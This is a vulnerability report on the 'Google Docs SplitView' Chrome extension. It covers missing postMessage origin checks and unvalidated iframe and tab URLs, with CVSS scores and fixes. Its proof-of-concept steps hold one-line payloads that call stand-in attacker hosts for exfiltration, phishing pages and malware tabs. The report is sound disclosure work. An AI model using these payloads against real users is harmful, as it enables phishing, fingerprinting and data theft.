# Vulnerability Report: Google Docs SplitView (mhekpeihiapfhjefakclpbmdofbmldcb)

**Extension:** Google Docs SplitView v2.1.5
**Manifest Version:** 3
**Permissions:** tabs, activeTab, storage, scripting
**Host Permissions:** `https://docs.google.com/*`
**Analysis Date:** 2026-02-06

---

## Executive Summary

The extension embeds Google Docs/Sheets/Slides pages inside iframes within a viewer page and synchronizes scroll state, focus mode, and title resolution across frames using `postMessage`. **Zero `event.origin` checks exist across the entire codebase** (7 distinct `message` event listeners, 0 origin validations). Combined with no URL validation on iframe creation paths, this creates multiple exploitable vulnerabilities.

The content scripts (`contentScript.js`, `focusMode.js`) run inside Google Docs pages with `all_frames: true`, meaning any iframe on `docs.google.com` will have these scripts injected. The viewer page accepts arbitrary URLs from query parameters and creates iframes for them without validation.

---

## Vulnerability 1: Unvalidated postMessage Listener in Content Script Enables Cross-Origin Scroll Hijacking

**CVSS 3.1:** 4.3 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`

**File:** `/js/contentScript.js`, lines 103-163
**File:** `/js/contentScript.js`, line 189

### Description

The content script registers a `message` event listener on line 103 that processes several message types (`setLinkedScrolling`, `syncScrollRatioRequest`, `syncScrollRatio`, `syncScrollDelta`). While it checks `event.source !== window.parent` on line 104 (rejecting messages not from the parent frame), there is **no `event.origin` validation**.

The content script runs on `https://docs.google.com/*` with `all_frames: true`. If a Google Docs page contains any embedded iframe (e.g., from an Add-on, or a user-embedded object), that iframe could set `window.parent` as its parent and send crafted messages. More importantly, the `event.source === window.parent` check is insufficient because:

1. If the viewer page (which is the parent) is compromised or if the extension's viewer page is opened by a malicious site, any origin could be the parent.
2. The `syncScrollDelta` handler on line 138 directly controls `scrollable.scrollTop` using attacker-controlled `event.data.deltaPages`, enabling forced scrolling of the user's Google Doc.

On line 189, the content script sends `{ type: "contentScriptReady" }` to `window.parent` with target origin `"*"`, leaking the fact that the extension is installed to any parent frame.

### PoC Exploit Scenario

1. Attacker creates a page that iframes the extension's viewer page (or, in the case of the content script, the Google Doc is loaded in an iframe whose parent the attacker controls).
2. Attacker sends: `iframe.contentWindow.postMessage({ type: "syncScrollDelta", deltaPages: 999 }, "*")`
3. The victim's Google Doc scrolls to an arbitrary position without user consent.
4. The `contentScriptReady` message leaks extension fingerprint to any parent.

### Impact

- Forced document scrolling (UI manipulation)
- Extension fingerprinting via `contentScriptReady` broadcast to `"*"`

---

## Vulnerability 2: Unvalidated postMessage Listeners in Viewer Page Enable UI Manipulation from Any Origin

**CVSS 3.1:** 5.4 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

**File:** `/js/viewer/init.js`, lines 179-200
**File:** `/js/viewer/iframeManager.js`, lines 897-923
**File:** `/js/viewer/scrollSync.js`, lines 44-63
**File:** `/js/viewer/toolbarActions.js`, lines 416-434, 693-704

### Description

The viewer page (`viewer.html`) has **five separate `message` event listeners**, none of which validate `event.origin`:

1. **`init.js:179`** - Handles `contentScriptReady` and `iframeScrollDelta`. On `contentScriptReady`, it responds by sending the current scroll sync configuration via `event.source.postMessage(..., "*")`. On `iframeScrollDelta`, it forwards scroll deltas to all other iframes. An attacker-controlled iframe could trigger scroll sync propagation to all loaded Google Docs.

2. **`iframeManager.js:897`** - Handles `preserveTitleState` and `restoreTitleState`. These accept a `url` parameter from the message data and use it to find a frame via `findFrameByUrl(url)`, then modify its title text content. Any origin can manipulate displayed frame titles.

3. **`scrollSync.js:44`** - Handles `syncScrollRatio`. Accepts a numeric `ratio` from any origin and forwards it to all iframe content windows, enabling cross-origin scroll control of all embedded documents.

4. **`toolbarActions.js:416`** - Handles `focusModeState`. Any origin can toggle the focus mode button state and `dataset.focusModeEnabled` for any frame container. The check `iframe.contentWindow === event.source` is a same-reference check but has no origin validation.

5. **`toolbarActions.js:693`** - Handles `resolveFrameTitle`. Accepts a `url` from message data, finds a matching iframe by `src`, then calls `fetchWithRetry(url)` to fetch arbitrary HTML and extract a title. This is an SSRF-like vector: any origin can cause the viewer page to make fetch requests to arbitrary URLs.

### PoC Exploit Scenario

1. Attacker embeds the extension's viewer page in an iframe or opens it via `window.open`.
2. Attacker sends: `target.postMessage({ type: "resolveFrameTitle", url: "https://attacker.com/exfil?token=..." }, "*")`
3. The viewer page makes a `fetch()` request to `attacker.com` with the victim's cookies/headers for that domain (if any).
4. Attacker sends: `target.postMessage({ type: "preserveTitleState", url: "https://docs.google.com/document/d/XXXX" }, "*")` followed by `{ type: "restoreTitleState", url: "..." }` to manipulate displayed titles (social engineering vector).

### Impact

- Attacker can trigger fetch requests to arbitrary URLs from the viewer page context
- Title spoofing of displayed documents (phishing/social engineering within the extension UI)
- Forced scroll synchronization across all open documents
- Focus mode state manipulation

---

## Vulnerability 3: No URL Validation on iframe Creation Allows Embedding Arbitrary Origins

**CVSS 3.1:** 6.1 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

**File:** `/js/viewer/urlManager.js`, lines 4-8
**File:** `/js/viewer/iframeManager.js`, lines 54-66
**File:** `/js/viewer/modalManager.js`, lines 468-522 (`addNewFrame`)
**File:** `/js/background.js`, lines 6-13

### Description

The extension loads URLs from query parameters and user input into iframes with **no validation** that they are Google Docs/Sheets/Slides URLs:

1. **`urlManager.js:4-8`** (`getURLs`): Parses the `urls` query parameter by splitting on commas after URL-decoding. No validation against an allowlist. Any URL passed via `?urls=` is loaded into an iframe.

2. **`iframeManager.js:54-66`** (`setupIframe`): Creates an iframe element and sets `iframe.src = url` directly. No URL validation.

3. **`modalManager.js:281-288`** (Paste URL tab): The user can paste any URL, and `addNewFrame(urlToAdd)` is called without validation. `addNewFrame` (line 468) passes the URL through to `setupIframe` without checking the domain.

4. **`background.js:6-13`**: The `openDocument` message handler creates a new tab with `chrome.tabs.create({ url: message.docUrl })` where `message.docUrl` comes from a `chrome.runtime.onMessage` without URL validation. While this requires the message to originate from within the extension context, a compromised extension page could open arbitrary URLs.

5. **`background.js:17-19`**: The `openViewerWithUrls` handler appends user-controlled URLs directly to the viewer page URL.

Because the extension has the `scripting` permission and `host_permissions` for `docs.google.com/*`, and the content scripts run with `all_frames: true`, any iframe within the viewer page pointing to `docs.google.com` will have the content scripts injected. This means the scroll sync, focus mode, and title resolution postMessage handlers will all be active inside attacker-chosen documents.

### PoC Exploit Scenario

1. Attacker crafts a link: `chrome-extension://mhekpeihiapfhjefakclpbmdofbmldcb/html/viewer.html?urls=https%3A%2F%2Fattacker.com%2Fphishing-page`
2. Victim clicks the link (e.g., shared via social engineering).
3. The extension's viewer page loads `attacker.com/phishing-page` in an iframe within the extension's trusted UI, complete with the extension's toolbar and styling.
4. The phishing page appears to be a legitimate Google Doc within the extension's split-view interface.
5. Alternatively, using `javascript:` or `data:` URIs could be attempted (though modern browsers may block these in iframe src).

### Impact

- Phishing: Arbitrary web content displayed within the extension's trusted viewer UI
- The extension's toolbar, sidebar, and branding provide false legitimacy to malicious content
- If the embedded page is on `docs.google.com`, content scripts are injected, enabling the postMessage-based attacks from Vulnerabilities 1 and 2

---

## Vulnerability 4: Unvalidated postMessage in focusMode.js Enables Remote UI Manipulation on Google Docs Pages

**CVSS 3.1:** 4.7 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`

**File:** `/js/focusMode.js`, lines 900-921

### Description

The `focusMode.js` content script (injected into all Google Docs pages with `all_frames: true`) registers a `message` event listener on line 901 that accepts `enterMode` and `exitMode` actions:

```javascript
window.addEventListener("message", (event) => {
  if (event.source === window.parent) {
    if (event.data.action === "enterMode") {
      window.focusMode.enterMode();
    } else if (event.data.action === "exitMode") {
      window.focusMode.exitMode();
    }
  }
});
```

While it checks `event.source === window.parent`, there is **no `event.origin` check**. The `enterMode()` function (line 569) performs significant DOM manipulation on the Google Docs page:

- Adds/removes CSS classes that hide the toolbar, menus, and navigation (`df-enabled`)
- Programmatically clicks Google Docs UI elements (`clickInterfaceElement`)
- Dispatches synthetic keyboard events (Ctrl+Shift+F) to toggle toolbar visibility
- Modifies editor container width
- Stores state in localStorage keyed by URL

The `exitMode()` function (line 730) similarly performs extensive DOM restoration, dispatches keyboard events, and posts messages back to the parent with `"*"` target origin.

Additionally, on lines 672-675, 723-726, and 810-813, the focus mode state changes are broadcast to `window.parent` via `postMessage(..., "*")`, leaking focus mode state to any parent frame.

### PoC Exploit Scenario

1. Attacker creates a page that iframes a Google Docs URL: `<iframe src="https://docs.google.com/document/d/VICTIM_DOC/edit">`
2. After the content script loads, attacker sends: `iframe.contentWindow.postMessage({ action: "enterMode" }, "*")`
3. The victim's Google Doc enters distraction-free mode: toolbar disappears, menus are hidden, synthetic keyboard events are dispatched.
4. This could be used for:
   - Denial-of-service: hiding the Google Docs UI from the user
   - Confusion attack: toggling modes repeatedly to disrupt user workflow
   - The broadcast of `focusModeState` back to `"*"` confirms extension installation

### Impact

- Remote UI manipulation of Google Docs pages via cross-origin message
- Extension fingerprinting via state broadcast to wildcard origin
- Potential workflow disruption for targeted users

---

## Vulnerability 5: Background Script Opens Arbitrary URLs in New Tabs Without Validation

**CVSS 3.1:** 4.3 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N`

**File:** `/js/background.js`, lines 5-13

### Description

The background service worker listens for `chrome.runtime.onMessage` with action `openDocument` and opens a new tab with the URL from `message.docUrl` without any validation:

```javascript
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "openDocument" && message.docUrl) {
        chrome.tabs.create({ url: message.docUrl }, function(tab) {
            sendResponse({status: "success", tabId: tab.id});
        });
        return true;
    }
});
```

While `chrome.runtime.onMessage` can only be triggered from pages within the extension's own context (popup, content scripts, viewer page), the content scripts run on `docs.google.com` with `all_frames: true`. If an attacker can achieve script execution within any frame on `docs.google.com` (e.g., via XSS in a Google Docs add-on or embedded content), they could send this message to open arbitrary URLs.

Additionally, on line 18, `openViewerWithUrls` concatenates `message.urls` directly into a URL string without sanitization, which could enable URL parameter injection.

### PoC Exploit Scenario

1. Attacker achieves code execution within an iframe on `docs.google.com` where the content script is injected.
2. Attacker calls: `chrome.runtime.sendMessage({ action: "openDocument", docUrl: "https://attacker.com/malware" })`
3. A new tab opens to the attacker's URL.

### Impact

- Navigation to attacker-controlled URLs via the extension's background script
- Requires prior code execution in a content script context (elevated prerequisite)

---

## Summary Table

| # | Title | CVSS | Severity | File(s) |
|---|-------|------|----------|---------|
| 1 | Unvalidated postMessage in Content Script | 4.3 | Medium | contentScript.js:103-163,189 |
| 2 | Unvalidated postMessage Listeners in Viewer Page (5 handlers) | 5.4 | Medium | init.js:179, iframeManager.js:897, scrollSync.js:44, toolbarActions.js:416,693 |
| 3 | No URL Validation on iframe Creation | 6.1 | Medium | urlManager.js:4-8, iframeManager.js:54-66, modalManager.js:468, background.js:6-13 |
| 4 | Unvalidated postMessage in focusMode.js | 4.7 | Medium | focusMode.js:900-921 |
| 5 | Background Script Opens Arbitrary URLs | 4.3 | Medium | background.js:5-13 |

---

## Recommendations

1. **Add `event.origin` validation to all `message` event listeners.** Check against the expected origin (`https://docs.google.com` for content script listeners, or `chrome-extension://mhekpeihiapfhjefakclpbmdofbmldcb` for viewer page listeners).
2. **Validate URLs before iframe creation.** Enforce an allowlist pattern (`https://docs.google.com/(document|spreadsheets|presentation)/...`) in `getURLs()`, `setupIframe()`, `addNewFrame()`, and the background script handlers.
3. **Use specific target origins in `postMessage` calls.** Replace all `postMessage(..., "*")` with the specific expected origin (e.g., `"https://docs.google.com"` or the extension origin).
4. **Validate `message.docUrl` in the background script** against the Google Docs URL pattern before calling `chrome.tabs.create`.
5. **Remove or gate the `customIframeLoader.js` CORS proxy usage.** The file contains hardcoded CORS proxy URLs that could be abused, though it does not appear to be actively loaded in the current manifest.
